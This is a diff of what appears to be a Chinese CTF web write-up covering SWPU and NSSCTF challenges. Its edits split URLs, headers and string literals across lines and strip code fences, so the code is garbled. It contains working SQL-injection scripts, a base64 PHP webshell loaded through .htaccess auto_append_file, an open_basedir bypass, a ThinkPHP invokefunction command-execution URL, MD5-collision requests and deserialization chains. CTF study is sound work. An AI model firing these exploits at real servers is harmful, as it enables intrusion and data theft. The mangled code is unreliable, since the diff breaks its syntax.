@@ -50,7 +50,8 @@ happy_rce
 
 <?php
 error_reporting(0);
-header("Content-Type:text/html;charset=utf-8");
+header("Content-Type:
+text/html;charset=utf-8");
 highlight_file(__FILE__);
 if(isset($_POST['url']))
 {
@@ -68,16 +69,12 @@ else
 
 <?php
 error_reporting(0);
-header("Content-Type:text/html;charset=utf-8");
+header("Content-Type:
+text/html;charset=utf-8");
 highlight_file(__FILE__);
 if (isset($_GET['url'])) {
   $ip=$_GET['url'];
-  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|</i", $ip)){
-      die('换个方法吧？被过滤啦！');
-  }
-  eval($ip);
-}
-?>
+  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|
 
 发现未过滤$、_、[](), 直接构造HTTP请求
 
@@ -387,7 +384,8 @@ php -r 'var_dump(intval(0.58 * 100));'
 int(57)
 
 POST /?jiangnaij=36805032837458517684&csc8=57 HTTP/1.1
-Host: 175.24.172.136:30007
+Host: 175.24.172.136:
+30007
 Content-Length: 422
 Pragma: no-cache
 Cache-Control: no-cache
@@ -395,7 +393,8 @@ Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://175.24.172.136:30007/?jiangnaij=36805032837458517684&csc8=57
+Referer: http://175.24.172.136:
+30007/?jiangnaij=36805032837458517684&csc8=57
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
@@ -493,7 +492,8 @@ import requests
 import time
 from bs4 import BeautifulSoup
 
-url = 'http://175.24.172.136:30041/'
+url = 'http://175.24.172.136:
+30041/'
 s = requests.session()
 for i in range(200):
  print(i)
@@ -504,7 +504,8 @@ for i in range(200):
  exres = eval(get_express)
  time.sleep(1)
  data = {
-  'result':exres,
+  'result':
+exres,
   'submit': '提交'}
  r = s.post(url,data=data)
  print(r.text)
@@ -602,7 +603,8 @@ def inject(url):
    #payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_schema=0x737770755F776C6C6D5F626F6F6C73716C),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
    payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(flag)/**/From/**/username),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
    print(payload)
-   params = {'username':payload}
+   params = {'username':
+payload}
    start_time = time.time() # 注入前的系统时间
    r = requests.post(url,data = params)
    end_time = time.time()  #  注入后的时间
@@ -617,7 +619,8 @@ def inject(url):
   name = name + chr(mid) 
   print(name)
 
-inject("http://175.24.172.136:30063/")
+inject("http://175.24.172.136:
+30063/")
 
 NSS Web
 
@@ -645,7 +648,7 @@ if (isset($_GET['num'])) {
 
 2. 奇妙的MD5
 
-ffifdyop ->  md5: 276f722736c95d99e921722cf9ed621c -> to string: 'or'6<trash>
+ffifdyop ->  md5: 276f722736c95d99e921722cf9ed621c -> to string: 'or'6
 
 <!--
 $x= $GET['x'];
@@ -667,13 +670,15 @@ if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
 }
 
 POST /f1na11y.php HTTP/1.1
-Host: 1.14.71.254:28607
+Host: 1.14.71.254:
+28607
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28607/f1na11y.php
+Referer: http://1.14.71.254:
+28607/f1na11y.php
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Cookie: td_cookie=955577959
@@ -727,16 +732,19 @@ if (isset($_GET['get'])){
 AddType application/x-httpd-php .jpg
 
 POST / HTTP/1.1
-Host: 1.14.71.254:28890
+Host: 1.14.71.254:
+28890
 Content-Length: 322
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
-Origin: http://1.14.71.254:28890
+Origin: http://1.14.71.254:
+28890
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoeioPhnZHf89aU1I
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28890/
+Referer: http://1.14.71.254:
+28890/
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Connection: close
@@ -755,15 +763,18 @@ Content-Disposition: form-data; name="submit"
 <?检测
 
 POST / HTTP/1.1
-Host: 1.14.71.254:28890
+Host: 1.14.71.254:
+28890
 Content-Length: 335
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://1.14.71.254:28890
+Origin: http://1.14.71.254:
+28890
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqQFrjPfCB9vBZcue
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28890/
+Referer: http://1.14.71.254:
+28890/
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Cookie: td_cookie=957449640; PHPSESSID=7ad99d11abbb350e60d1e78984493ab0
@@ -803,7 +814,8 @@ if(isset($_GET['p'])){
     highlight_file(__FILE__);
 }
 
-/NsScTf.php?p=Nss2::Ctf
+/NsScTf.php?p=Nss2::
+Ctf
 
 8. ez_ez_php(revenge)
 
@@ -964,7 +976,8 @@ echo urlencode(serialize(new lyh()));
 13.xff
 
 GET / HTTP/1.1
-Host: 1.14.71.254:28860
+Host: 1.14.71.254:
+28860
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -972,8 +985,10 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36�
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
-Referer: http://1.14.71.254:28860/home
-X-FORWARDED-FOR:127.0.0.1
+Referer: http://1.14.71.254:
+28860/home
+X-FORWARDED-FOR:
+127.0.0.1
 Connection: close
 
 14. js_sign
@@ -996,33 +1011,13 @@ https://www.boxentriq.com/code-breaking/tap-code
 .....
 <!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->
 .....
-```
-
-
-
-```
 /?wllm='+order+by+4%23 # Unknown column '4' in 'order clause'
-```
-
-
-
-```
 /?wllm='+union+select+1,2,3%23
 
 # 回显
 Your Login name:2
 Your Password:3
-```
-
-
-
-```
 /?wllm='+union+select+1,2,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)%23
-```
-
-
-
-```
 #回显
 ......
 ......
@@ -1033,20 +1028,11 @@ Your Password:3
 [ test_db ] > users > password|
 [ test_peng ] > test_2tb > number|
 [ test_peng ] > test_2tb > ffflllaaaggg|
-```
-
-
-
-```
 /?wllm='+union+select+1,2,(select+fllaag+from+test_tb)%23
-```
-
-
-
-```
 <?php
 error_reporting(0);
-header("Content-Type:text/html;charset=utf-8");
+header("Content-Type:
+text/html;charset=utf-8");
 highlight_file(__FILE__);
 if(isset($_POST['url']))
 {
@@ -1059,28 +1045,14 @@ else
     echo "怎么POST一个url？？";
 
 ?> 怎么POST一个url？？
-```
-
-
-
-```
 <?php
 error_reporting(0);
-header("Content-Type:text/html;charset=utf-8");
+header("Content-Type:
+text/html;charset=utf-8");
 highlight_file(__FILE__);
 if (isset($_GET['url'])) {
   $ip=$_GET['url'];
-  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|</i", $ip)){
-      die('换个方法吧？被过滤啦！');
-  }
-  eval($ip);
-}
-?>
-```
-
-
-
-```
+  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|
 <?php
 highlight_file(__FILE__);
 class A
@@ -1104,11 +1076,6 @@ class A
 }
 
 unserialize($_POST['data']);
-```
-
-
-
-```
 <?php
 class A
 {
@@ -1120,11 +1087,6 @@ class A
 }
 $a = str_replace('"A":1:', '"A":2:', serialize(new A()));
 echo urlencode($a); // private
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 
@@ -1143,11 +1105,6 @@ $newnew = unserialize($_GET['newnew']);
 throw new Exception('can can need new new');
 
 Fatal error: Uncaught Exception: can can need new new in /var/www/html/index.php:16 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 16
-```
-
-
-
-```
 <?php
 class A
 {
@@ -1159,24 +1116,9 @@ $o = array(new A, new A);
 echo serialize($o);
 # a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:1;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}}
 # a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}
-```
-
-
-
-```
 ?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}
 # fl1aaaaaaa9
-```
-
-
-
-```
 ?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:13:"SplFileObject";s:1:"b";s:12:"/fl1aaaaaaa9";}i:0;i:0;}
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 error_reporting(0);
@@ -1187,11 +1129,6 @@ if (isset($_GET['source'])) {
 } else {
     unserialize($_GET['pop']);
 }
-```
-
-
-
-```
 class dstbp
 {
     private $cmd;
@@ -1260,11 +1197,6 @@ class jiangnaij
         ($this->code)();
     }
 }
-```
-
-
-
-```
 <?php
 
 class dstbp
@@ -1307,11 +1239,6 @@ $m->ctf = $j;
 $s = new s0rry();
 $s->hint = $m;
 echo urlencode(serialize($s));
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 error_reporting(0);
@@ -1350,11 +1277,6 @@ if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
     else echo "相等吗？？？";
 }
 else echo "输入一个数，这个数md5加密后前六位全是6！";
-```
-
-
-
-```
 import multiprocessing
 import hashlib
 import random
@@ -1392,20 +1314,11 @@ if __name__ == '__main__':
 
     for p in processes:
         p.join()
-```
-
-
-
-```
 php -r 'var_dump(intval(0.58 * 100));'
 int(57)
-```
-
-
-
-```
 POST /?jiangnaij=36805032837458517684&csc8=57 HTTP/1.1
-Host: 175.24.172.136:30007
+Host: 175.24.172.136:
+30007
 Content-Length: 422
 Pragma: no-cache
 Cache-Control: no-cache
@@ -1413,24 +1326,15 @@ Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://175.24.172.136:30007/?jiangnaij=36805032837458517684&csc8=57
+Referer: http://175.24.172.136:
+30007/?jiangnaij=36805032837458517684&csc8=57
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 pysnow[]=Tao&M1sery[]=oo&s0rry=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&DSTBP=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
-```
-
-
-
-```
 flag2:
 17fa-4aec-
-```
-
-
-
-```
 <?php
 $url=$_POST['url'];
 $x=parse_url($url);
@@ -1452,54 +1356,25 @@ else{
     die('怎么做？');
 }
 ?>
-```
-
-
-
-```
 ?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),user(),CHAR(126)))%23
-```
-
-
-
-```
 /?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
 # XPATH syntax error: '~mysql,test_db,test_db~'
-```
-
-
-
-```
 /?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
 # '~gtid_slave_pos,test_tb,users~'
-```
-
-
-
-```
 /?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/`2`/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23  
 # XPATH syntax error: '~swpu{aba16000-448a-4bfb-874f-7d'
 
 /?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Reverse(`2`)/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23
 
 XPATH syntax error: '~}69e2a4f858d7-f478-bfb4-a844-00'
-```
-
-
-
-```
 $wllm = waf($_GET["wllm"]);
 include("$wllm");
-```
-
-
-
-```
 import requests
 import time
 from bs4 import BeautifulSoup
 
-url = 'http://175.24.172.136:30041/'
+url = 'http://175.24.172.136:
+30041/'
 s = requests.session()
 for i in range(200):
  print(i)
@@ -1510,18 +1385,14 @@ for i in range(200):
  exres = eval(get_express)
  time.sleep(1)
  data = {
-  'result':exres,
+  'result':
+exres,
   'submit': '提交'}
  r = s.post(url,data=data)
  print(r.text)
  if 'swpu{' in r.text:
   print(r.text)
   break
-```
-
-
-
-```
 <?php
 include_once "flag.php";
 error_reporting(0);
@@ -1547,45 +1418,20 @@ if (isset($_GET['key']) && waf(strtolower($_GET['key']))) {
 } else {
     highlight_file(__FILE__);
 }
-```
-
-
-
-```
 file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
-```
-
-
-
-```
 php_value auto_append_file "php://filter/convert.base64-decode/resource=Tao.php"
-```
-
-
-
-```
 # Tao.php 内容如下：
 PD9waHAgZWNobyAiVGFvIjtldmFsKCRfUkVRVUVTVFswXSk7Pz4=
 # 解码为：
 # <?php echo "Tao";eval($_REQUEST[0]);?>
-```
-
-
-
-```
 ?0=var_dump(new DirectoryIterator("glob:///f*"));
 # /fllllllllllll4g
 ?0=mkdir('Tao');chdir('Tao');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo (file_get_contents('fllllllllllll4g'));
-```
-
-
-
-```
 import requests
 import time
 # swpu_wllm_boolsql
 # gtid_slave_pos,flag,username
-#id,username,password,id,flag
+    #id,username,password,id,flag
 
 def inject(url):
  name = ''
@@ -1600,7 +1446,8 @@ def inject(url):
    #payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_schema=0x737770755F776C6C6D5F626F6F6C73716C),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
    payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(flag)/**/From/**/username),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
    print(payload)
-   params = {'username':payload}
+   params = {'username':
+payload}
    start_time = time.time() # 注入前的系统时间
    r = requests.post(url,data = params)
    end_time = time.time()  #  注入后的时间
@@ -1615,12 +1462,8 @@ def inject(url):
   name = name + chr(mid) 
   print(name)
 
-inject("http://175.24.172.136:30063/")
-```
-
-
-
-```
+inject("http://175.24.172.136:
+30063/")
 <?php
 error_reporting(0);
 header("Content-Type: text/html;charset=utf-8");
@@ -1636,22 +1479,12 @@ if (isset($_GET['num'])) {
         echo "这为何相等又不相等";
     }
 }
-```
-
-
-
-```
 <!--
 $x= $GET['x'];
 $y = $_GET['y'];
 if($x != $y && md5($x) == md5($y)){
     ;
 -->
-```
-
-
-
-```
 <?php
 error_reporting(0);
 include "flag.php";
@@ -1661,19 +1494,16 @@ highlight_file(__FILE__);
 if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
     echo $FLAG;
 }
-```
-
-
-
-```
 POST /f1na11y.php HTTP/1.1
-Host: 1.14.71.254:28607
+Host: 1.14.71.254:
+28607
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28607/f1na11y.php
+Referer: http://1.14.71.254:
+28607/f1na11y.php
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Cookie: td_cookie=955577959
@@ -1682,11 +1512,6 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 393
 
 wqh=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&dsy=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
-```
-
-
-
-```
 <?php
 error_reporting(0);
 
@@ -1709,28 +1534,21 @@ if (isset($_GET['get'])){
     }
 
 }
-```
-
-
-
-```
 AddType application/x-httpd-php .jpg
-```
-
-
-
-```
 POST / HTTP/1.1
-Host: 1.14.71.254:28890
+Host: 1.14.71.254:
+28890
 Content-Length: 322
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
-Origin: http://1.14.71.254:28890
+Origin: http://1.14.71.254:
+28890
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoeioPhnZHf89aU1I
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28890/
+Referer: http://1.14.71.254:
+28890/
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Connection: close
@@ -1745,21 +1563,19 @@ Content-Disposition: form-data; name="submit"
 
 上传
 ------WebKitFormBoundaryoeioPhnZHf89aU1I--
-```
-
-
-
-```
 POST / HTTP/1.1
-Host: 1.14.71.254:28890
+Host: 1.14.71.254:
+28890
 Content-Length: 335
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://1.14.71.254:28890
+Origin: http://1.14.71.254:
+28890
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqQFrjPfCB9vBZcue
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://1.14.71.254:28890/
+Referer: http://1.14.71.254:
+28890/
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Cookie: td_cookie=957449640; PHPSESSID=7ad99d11abbb350e60d1e78984493ab0
@@ -1775,17 +1591,7 @@ Content-Disposition: form-data; name="submit"
 
 上传
 ------WebKitFormBoundaryqQFrjPfCB9vBZcue--
-```
-
-
-
-```
 NSSCTF{TnNTY1RmLnBocA==} -> NsScTf.php
-```
-
-
-
-```
 <?php
 error_reporting(0);
 //hint: 与get相似的另一种请求协议是什么呢
@@ -1802,25 +1608,10 @@ if(isset($_GET['p'])){
 }else{
     highlight_file(__FILE__);
 }
-```
-
-
-
-```
 /NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find+/+-type+f+-name+'flag'+2>/dev/null
 
 /NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/nss/ctf/flag/flag
-```
-
-
-
-```
 nss=-41'/**/Ununionion/**/SelEct/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb%23
-```
-
-
-
-```
 <?php
 error_reporting(0);
 class dxg
@@ -1874,11 +1665,6 @@ if (isset($_GET['NSS'])) {
 } else {
    highlight_file(__file__);
 }
-```
-
-
-
-```
 <?php
 error_reporting(0);
 class dxg
@@ -1915,11 +1701,6 @@ class lt
 $a = serialize(new lt());
 $a = str_replace('"lt":3:','"lt":4:',$a);
 echo urlencode($a);
-```
-
-
-
-```
 <?php
  
 class lyh{
@@ -1941,12 +1722,7 @@ highlight_file(__FILE__);
  
  
 ?>
-```
-
-
-
-```
-#exp
+    #exp
 <?php
  
 class lyh{
@@ -1966,13 +1742,9 @@ class lyh{
 echo urlencode(serialize(new lyh()));
  
 ?>
-```
-
-
-
-```
 GET / HTTP/1.1
-Host: 1.14.71.254:28860
+Host: 1.14.71.254:
+28860
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -1980,14 +1752,11 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36�
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
-Referer: http://1.14.71.254:28860/home
-X-FORWARDED-FOR:127.0.0.1
+Referer: http://1.14.71.254:
+28860/home
+X-FORWARDED-FOR:
+127.0.0.1
 Connection: close
-```
-
-
-
-```
 document.getElementsByTagName("button")[0].addEventListener("click", ()=>{
     flag="33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"
     if (btoa(flag.value) == 'dGFwY29kZQ==') {
